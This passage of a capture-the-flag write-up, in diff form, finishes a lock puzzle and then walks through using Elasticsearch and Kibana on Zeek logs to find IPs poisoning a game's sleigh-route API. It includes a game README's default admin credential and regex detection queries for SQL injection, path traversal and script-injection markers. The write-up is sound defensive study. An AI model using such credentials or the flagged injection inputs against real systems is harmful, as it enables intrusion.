+.Inners of the lock
+image::11/14-uncovered.png[]
++
+NOTE: You can see that there are three elements missing from the lock, a cotton swab, gnome, and macaroni; also note the code is at the bottom right of the board.
++
+** Copy + paste the missing elements into the lock container
++
+.Copy the components
+image::11/15-find.png[]
++
+.Ctrl + v it into the lock container
+image::11/16-fixed.png[]
+
+image::11/17-end.png[]
+
+*Answer:* `The Tooth Fairy`
+
+==== Chat
+
+.Chat log
+----
+(Shinny Upatree - PRE)
+- Hey there.
+- Psst - hey!
+- I'm Shinny Upatree, and I know what's going on!
+- Yeah, that's right - guarding the sleigh shop has made me privvy to some serious, high-level intel.
+- In fact, I know WHO is causing all the trouble.
+- Cindy? Oh no no, not that who. And stop guessing - you'll never figure it out.
+- The only way you could would be if you could break into my crate, here.
+- You see, I've written the villain's name down on a piece of paper and hidden it away securely!
+
+(Shinny Upatree - POST)
+- Wha - what?? You got into my crate?!
+- Well that's embarrassing...
+- But you know what? Hmm... If you're good enough to crack MY security...
+- Do you think you could bring this all to a grand conclusion?
+- Please go into the sleigh shop and see if you can finish this off!
+- Stop the Tooth Fairy from ruining Santa's sleigh route!
+----
+
+=== 12 - Filter Out Poisoned Sources of Weather Data
+
+Location: `https://srf.elfu.org/`
+
+Difficulty: `4/5`
+
+image::12/00-location.png[]
+
+.Objective
+----
+Use the data supplied in the Zeek JSON logs to identify the IP addresses of attackers poisoning Santa's flight mapping software. Block the 100 offending sources of information to guide Santa's sleigh through the attack. Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.
+----
+
+==== Links
+
+* https://srf.elfu.org/[SRF - Sleigh Route Finder API]
+** Main website
++
+* https://mega.nz/#!JohAyawJ!M-YZoSBVGiyWuj3uAD_MKFf1CxEVQyXs3eT4q2we8Pw[http.log.gz]
+** Zeek http logs
++
+NOTE: SHA256: `d96b030ad3aba71dc62c2e50524340cda925fe87b462019611a919f8b7c6bca4`
+
+==== Solution
+
+. Create working directory
++
+[source, bash, options="nowrap"]
+----
+# Create a temp directory
+[~]$ cd "$(mktemp -d /tmp/ctf-12.XXX)"
+
+# Copy `http.log.gz` into the working directory
+[/tmp/ctf-12.Wdg]$ cp /path/to/http.log.gz .
+
+# Uncompress the file
+[/tmp/ctf-12.Wdg]$ gunzip http.log.gz
+----
++
+. Ingest this data into an Elastic stack
++
+[source, bash, options="nowrap"]
+----
+# Convert the given file into a jsonl file
+[/tmp/ctf-12.Wdg]$ jq -c '.[]' http.log > http.jsonl
+
+# Extract logstash & docker-compose config
+[/tmp/ctf-12.Wdg]$ base64 -d << 'EOF' | tar -xzf -
+H4sIAGSlCl4AA+2VTY/TMBCGe86vGPVSkDZuku62EKncOXHgiNDK67hb08SubCdQdvvfmSTu566o
+kBYQYp5Icey8no8kMymMWEkbC1OtjZNsU5WDFydBptfX3Yicj2k2mQzSyTTJbrJsMksHSTrJ0nQA
+ycuH8pTaeW4BBtYY/zPdpfv/KHEcR420Thmdw2jCZqMoctI2SkiXRwCy5M4r4SS3YtkuAKiK38sc
+iu7LYUHAhBmfaE9nsXEun7EblnYmGlPWVe+gJQa8HtfOjt2SW3lmqOCe5/Zrp5W6UdboSmp/2Fwo
+JwwmsWF+s5Zzp/R9KWNtChmhZqXuuOYXQu9FYTgLdm2sPwo1zWYswSPNb6ZJfxp7sX4+r+D8KLfg
+aZcUKktzj9+gu/R0d7L9xVmYWMIV10UObgmxgJHgHjo346X3a/bFGV3C494bxItwe7eCTvRi9Hwe
+7MhIfm41t+ZIeGIuf8ZFK4+OPOAZHraHN9VOGGPR3y6N/4KTN/ObfFzo/8k0mx76f5ph/8+y6xn1
+/z+B0uvawwNWn/OF0m3tbaNooUovbbfcVnh3gQpTWyFh/g6GWLoO+9QQ17dtD8Mql0FVcS+WrejT
+0LvhFQzff/zwBpvk8PNOXNX+ILeywt59u1CyLPpdO9u4FQ3sd9n6bhP2CGztXRjdbNl2sznIBn8K
+zJvbdr6/wSTHaAoDj6ur5jG0KbWABuZzGMWjsAJhex/Nq9XrsC51ER2PfcIYj6n97sGd/K1ChEoX
+8lsX4ncpV3HbK0OwxnnX53n6a32bJUlIdkutjyAIgiAIgiAIgiAIgiAIgiAIgiAIgvhFfgCd9VVW
+ACgAAA==
+EOF
+
+# Look at files extracted
+[/tmp/ctf-12.Wdg]$ cat docker-compose.yml
+---
+version: '3.7'
+
+services:
+  elasticsearch:
+    image: docker.elastic.co/elasticsearch/elasticsearch-oss:7.5.1
+    volumes:
+      - es:/usr/share/elasticsearch/data:rw
+    environment:
+      - discovery.type=single-node
+
+  kibana:
+    image: docker.elastic.co/kibana/kibana-oss:7.5.1
+    ports:
+      - 127.0.0.1:5601:5601/tcp
+    volumes:
+      - kibana:/usr/share/kibana/data:rw
+
+  logstash:
+    image: docker.elastic.co/logstash/logstash-oss:7.5.1
+    command: sh -c 'cat /data/http.jsonl | logstash -f /data/logstash.conf'
+    volumes:
+      - ./http.jsonl:/data/http.jsonl:ro
+      - ./logstash.conf:/data/logstash.conf:ro
+
+volumes:
+  es: {}
+  kibana: {}
+...
+
+[/tmp/ctf-12.Wdg]$ cat logstash.conf
+input {
+  stdin {}
+}
+
+filter {
+  json {
+    source => "message"
+  }
+
+  date {
+    match => ["ts", "ISO8601"]
+  }
+
+  mutate {
+    remove_field => ["message", "ts"]
+  }
+
+  ruby {
+    code => "
+    hash = event.to_hash
+    hash.each do |k,v|
+      if v == '-'
+        event.remove(k)
+      end
+    end
+    "
+  }
+}
+
+output {
+  elasticsearch {
+    index => "zeek-http"
+    hosts => ["elasticsearch:9200"]
+  }
+}
+
+# Build Elastic environment (Will also ingest data for you)
+[/tmp/ctf-12.Wdg]$ docker-compose up -d
+----
++
+. Add index pattern to Kibana
+** Select *Explore on my own*
++
+image::12/01-start.png[]
++
+** Open *Management* tab
++
+image::12/02-settings.png[]
++
+** Select *Index Patterns*
++
+image::12/03-index-patterns.png[]
++
+** Select *Create index pattern*
++
+image::12/04-create-pattern.png[]
++
+** Add pattern for `zeek-http*`
++
+image::12/05-zeek.png[]
++
+*** *Time Filter field name* to `@timestamp`
+. Look at the data
++
+image::12/06-discover.png[]
++
+** Where is my data?
++
+image::12/07-no-results.png[]
++
+** Set the time window for Kibana to look at
++
+image::12/08-better.png[]
++
+. We need to find the credentials
+** I spent a little looking through the data for keywords like `user` / `pass` / `admin` / `santa` but did not find anything.
+** I went back through the decrypted pdf from *challenge 10* and noticed this
++
+image::12/09-hint.png[]
++
+** So I checked if `/.git` was accessible (It was not)
+** Then I queried the dataset for `readme`
++
+image::12/10-search.png[]
++
+.Found https://srf.elfu.org/README.md
+[source, bash, options="nowrap"]
+----
+# Sled-O-Matic - Sleigh Route Finder Web API
+
+### Installation
+
+```
+sudo apt install python3-pip
+sudo python3 -m pip install -r requirements.txt
+```
+
+#### Running:
+
+`python3 ./srfweb.py`
+
+#### Logging in:
+
+You can login using the default admin pass:
+
+`admin 924158F9522B3744F5FCD4D10FAC4356`
+
+However, it's recommended to change this in the sqlite db to something custom.
+----
++
+.Logged in with the creds
+image::12/11-login.png[]
++
+. Start pivoting on the data
+** Looking for sketchy stuff in URIs
++
+.Quick search for uri tampering
+----
+uri.keyword:/.*(UNION|\.\.|etc\/|'|\<|\>|passw).*/
+----
++
+image::12/12-uri.png[]
++
+** Save JSON data to disk
++
+image::12/13-inspect.png[]
++
+image::12/14-data.png[]
++
+** Extract IPs from json blob
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ cat bad-uris.json | jq -r '.hits.hits[]._source."id.orig_h"' | tee ips-uris.txt | wc -l
+46
+----
++
+** I then noticed some unique data that did not fit in
++
+.Basic auth
+----
+    _exists_:username
+AND NOT username:"(empty)"
+----
++
+*** The API doesn't support basic auth according to the API
++
+image::12/15-user.png[]
++
+*** Save the response to disk
+*** Extract the ips
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ cat bad-users.json | jq -r '.hits.hits[]._source."id.orig_h"' | tee ips-users.txt | wc -l
+19
+----
++
+** I then sorted based on number of times a user agent appeared and noticed some weird user agents
+*** Search
++
+.Query
+----
+user_agent.keyword:/.*(\<|&|\$|'|UNION).*/
+----
++
+image::12/16-uas.png[]
++
+*** Save the json response to disk
+*** Extract the bad ips
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ cat bad-uas.json | jq -r '.hits.hits[]._source."id.orig_h"' | tee ips-uas.txt | wc -l
+15
+----
++
+** Get stuck for a while not finding anything else interesting
+** Started looking for weird data in all fields
+** Found stuff in the `host` field
+*** Search
++
+.Query
+----
+    _exists_:host
+AND NOT host:("ssrf.elfu.org" OR "srf.elfu.org" OR "10.20.3.80")
+----
++
+image::12/21-search.png[]
++
+*** Save json response to disk
+*** Extract ips
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ cat bad-host.json | jq -r '.hits.hits[]._source."id.orig_h"' | tee ips-host.txt | wc -l
+7
+----
++
+** Decided to pivot on the data in the known-bad ips
+** Noticed that the user agents might be useful
+** Pivot on user agents
+*** Create new index for use in an ElasticSearch https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-terms-query.html#query-dsl-terms-lookup-example[terms lookup] query
+**** Go to Dev tools
++
+image::12/17-dev-tools.png[]
++
+**** Build json list of ips
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ echo "[$(cat ips-host.txt ips-uris.txt ips-users.txt | sed -re 's|^(.+)$|"\1", |' | tr -d '\n' | sed -re 's|, $||')]"
+["200.75.228.240", "168.66.108.62", "80.244.147.207", "95.166.116.45", "123.127.233.97", "65.153.114.120", "61.110.82.125", "132.45.187.177", "28.169.41.122", "169.242.54.5", "193.228.194.36", "25.80.197.172", "79.198.89.109", "9.206.212.33", "116.116.98.205", "180.57.20.247", "187.178.169.123", "250.51.219.47", "211.229.3.254", "223.149.180.133", "75.215.214.65", "23.49.177.78", "229.133.163.235", "1.185.21.112", "253.182.102.55", "131.186.145.73", "230.246.50.221", "102.143.16.184", "45.239.232.245", "2.240.116.254", "135.32.99.116", "34.129.179.28", "190.245.228.38", "129.121.121.48", "106.132.195.153", "121.7.186.163", "238.143.78.114", "27.88.56.114", "249.34.9.16", "75.73.228.192", "225.191.220.138", "10.155.246.29", "2.230.60.70", "106.93.213.219", "44.74.106.131", "84.147.231.129", "49.161.8.58", "48.66.193.176", "42.191.112.181", "69.221.145.150", "19.235.69.221", "56.5.47.137", "42.103.246.250", "188.127.212.14", "135.118.158.216", "241.226.125.123", "150.50.77.238", "84.185.44.166", "254.140.181.172", "33.132.98.193", "98.69.67.75", "104.82.104.120", "208.14.190.102", "248.150.13.189", "168.145.213.152", "75.172.126.182", "18.181.152.167", "88.78.129.76", "40.213.20.94", "9.95.164.154", "142.115.169.193", "191.85.145.190"]
+----
++
+**** Create new index
++
+image::12/18-new-index.png[]
++
+NOTE: Press the *Play* button.
++
+**** Create document with known bad ips
++
+NOTE: Excluding the ips from user agents since we don't need them.
++
+image::12/19-make-doc.png[]
++
+*** Build list of bad user agents
+**** Add filter to discovery entry
++
+image::12/20-filter.png[]
++
+.Terms lookup filter
+----
+{
+  "query": {
+    "terms": {
+      "id.orig_h": {
+        "index": "bad-ips",
+        "path": "ips",
+        "id": "known-bad-1"
+      }
+    }
+  }
+}
+----
++
+**** Save the json response to disk
+**** Extract the user agents
++
+[source, bash, options="nowrap"]
+----
+[/tmp/ctf-12.Wdg]$ cat bad-user-agents.json | jq '.hits.hits[]._source.user_agent' | tee bad-user-agents.txt
+"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.68 Safari/534.30"
+"Mozilla/5.0 (Windows NT 10.0;Win64;x64)"
+"Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1"
+"Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)"
+"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/12.0.742.91"
+"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.18) Gecko/2010020400 SUSE/3.0.18-0.1.1 Firefox/3.0.18"
+"Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)"
+"Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5"
+"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)"
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22"
+"Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15"
+"Opera/8.54 (Windows NT 5.1; U; en)"
+"Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.1.9) Gecko/20071102 Firefox/2.0.0.9"
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/412.6 (KHTML, like Gecko) Safari/412.2"
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)"
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.6 (KHTML, like Gecko) Safari/125.12"
+"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3"
+"Opera/9.12 (Windows NT 5.0; U)"
+"Mozilla/4.0 (compatible MSIE 5.0;Windows_98)"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0"
+"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.17"
+"Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)"
+"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.1) Gecko/20090703 Firefox/3.5"
+"Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6 GTB7.0"
+"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416664997.4379"
+"Opera/9.50 (Windows NT 5.1; U; nl)"
+"Opera/8.81 (Windows-NT 6.1; U; en)"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731"
+"Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6."
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)"
+"RookIE/1.0"
+"Mozilla/5.0 WinInet"
+"CholTBAgent"
+"Mozilla/5.0 (Windows NT 5.1 ; v.)"
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )"
+"Wget/1.9+cvs-stable (Red Hat modified)"
+"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)"
+"Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)"
+"Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0"
+"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)"
+"Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)"
+"Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)"
+"Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13"
+"Mozilla/4.0 (compatible; Metasploit RSPEC)"
+"Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)"
+"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)"
+"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)"
+"Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)"
+"HttpBrowser/1.0"
+"Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)"
+----
++
+**** Build Query
++
+[options="nowrap"]
+----
+user_agent.keyword:("Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.4.15451" OR "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" OR "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36" OR "Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" OR "Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19" OR "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12" OR "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.68 Safari/534.30" OR "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1" OR "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1" OR "Mozilla/5.0 (Windows NT 10.0;Win64;x64)" OR "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.0.18) Gecko/2010021501 Ubuntu/9.04 (jaunty) Firefox/3.0.18" OR "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9b3) Gecko/2008020514 Opera 9.5" OR "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30" OR "Mozilla/4.0 (compatible; MSIE 5.13; Mac_PowerPC)" OR "Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1" OR "Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)" OR "Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.10) Gecko/20100914 Firefox/3.6.10 (.NET CLR 3.5.30729)" OR "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/12.0.742.91" OR "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.0.18) Gecko/2010020400 SUSE/3.0.18-0.1.1 Firefox/3.0.18" OR "Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)" OR "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5" OR "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)" OR "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22" OR "Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15" OR "Opera/8.54 (Windows NT 5.1; U; en)" OR "Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.8.1.9) Gecko/20071102 Firefox/2.0.0.9" OR "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/412.6 (KHTML, like Gecko) Safari/412.2" OR "Opera/6.05 (Windows 2000; U)  [oc]" OR "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5" OR "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)" OR "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.6 (KHTML, like Gecko) Safari/125.12" OR "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3" OR "Opera/9.12 (Windows NT 5.0; U)" OR "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.12 MEGAUPLOAD 1.0" OR "Mozilla/4.0 (compatible MSIE 5.0;Windows_98)" OR "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0" OR "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.17" OR "Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)" OR "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.9.1) Gecko/20090703 Firefox/3.5" OR "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.1.6) Gecko/20091215 Ubuntu/9.10 (karmic) Firefox/3.5.6 GTB7.0" OR "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416664997.4379" OR "Opera/9.50 (Windows NT 5.1; U; nl)" OR "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25" OR "Opera/8.81 (Windows-NT 6.1; U; en)" OR "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731" OR "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6." OR "Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)" OR "RookIE/1.0" OR "Mozilla/5.0 WinInet" OR "CholTBAgent" OR "Mozilla/5.0 (Windows NT 5.1 ; v.)" OR "Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )" OR "Wget/1.9+cvs-stable (Red Hat modified)" OR "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)" OR "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)" OR "Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)" OR "Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0" OR "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" OR "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)" OR "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)" OR "Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)" OR "Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)" OR "Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)" OR "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13" OR "Mozilla/4.0 (compatible; Metasploit RSPEC)" OR "Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N" OR "Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)" OR "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)" OR "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)" OR "Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)" OR "HttpBrowser/1.0" OR "Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)")
+----
++
+**** Create table showing number of times a UA shows up in the dataset
++
+image::12/22-ua-table.png[]
++
+**** Remove the normal looking ones form your search terms; we want the unique looking ones
+***** Export to csv
+***** Filter out ones with count `>8`
++
+[options="nowrap"]
+----
+"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/412.6 (KHTML, like Gecko) Safari/412.2"
+"Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)"
+"CholTBAgent"
+"HttpBrowser/1.0"
+"Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N"
+"Mozilla/4.0 (compatible MSIE 5.0;Windows_98)"
+"Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)"
+"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)"
+"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
+"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)"
+"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)"
+"Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)"
+"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)"
+"Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)"
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )"
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)"
+"Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)"
+"Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)"
+"Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)"
+"Mozilla/4.0 (compatible; Metasploit RSPEC)"
+"Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6."
+"Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1"
+"Mozilla/5.0 (Windows NT 10.0;Win64;x64)"
+"Mozilla/5.0 (Windows NT 5.1 ; v.)"
+"Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13"
+"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731"
+"Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)"
+"Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)"
+"Mozilla/5.0 WinInet"
+"Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)"
+"Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)"
+"Opera/8.81 (Windows-NT 6.1; U; en)"
+"RookIE/1.0"
+"Wget/1.9+cvs-stable (Red Hat modified)"
+"Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19"
+"Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
